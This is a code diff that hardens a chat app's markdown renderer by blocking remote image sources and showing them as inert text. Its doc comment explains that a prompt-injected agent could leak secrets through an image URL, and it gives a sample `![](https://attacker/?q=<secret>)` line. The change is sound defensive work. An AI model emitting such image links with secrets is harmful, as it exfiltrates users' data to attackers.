@@ -42,6 +42,29 @@ export function PreBlock({ node }: { node?: HastNode }) {
   return <pre className="md-pre"><code className="hljs" dangerouslySetInnerHTML={{ __html: highlightBlock(code, lang) }} /></pre>
 }
 
+/** Images in agent- or branch-authored markdown are fetched the moment they
+ *  render, so a remote `src` is an exfiltration channel for a prompt-injected
+ *  agent (`![](https://attacker/?q=<secret>)`). Only same-origin (the Limn
+ *  service itself) and inline `data:image/` sources are safe to load. `origin`
+ *  is the page's; without one (server-side render) only data: images pass. */
+export function isSafeImageSrc(src: string | undefined, origin: string | undefined = globalThis.location?.origin): boolean {
+  if (!src) return false
+  if (/^data:image\//i.test(src)) return true
+  if (!origin) return false
+  try {
+    return new URL(src, origin).origin === origin
+  } catch {
+    return false
+  }
+}
+
+/** `img` override: a safe source renders as an image; anything else renders as
+ *  inert text naming the image and its URL — never fetched, never a link. */
+export function SafeImage({ src, alt, title }: { src?: string; alt?: string; title?: string }) {
+  if (isSafeImageSrc(src)) return <img className="md-img" src={src} alt={alt ?? ''} title={title} />
+  return <span className="md-img-blocked" title="Remote image not loaded">[image: {alt || 'untitled'}]{src ? ` (${src})` : ''}</span>
+}
+
 /** Component overrides that carry the chat's existing md-* classNames so styling is
  *  unchanged from the old hand-rolled renderer. */
 export const MD_COMPONENTS: Components = {
@@ -57,6 +80,7 @@ export const MD_COMPONENTS: Components = {
   blockquote: ({ children }) => <blockquote className="md-quote">{children}</blockquote>,
   table: ({ children }) => <table className="md-table">{children}</table>,
   a: ({ href, children }) => <a className="md-link" href={href} target="_blank" rel="noreferrer">{children}</a>,
+  img: SafeImage,
   code: InlineCode,
   pre: PreBlock
 }
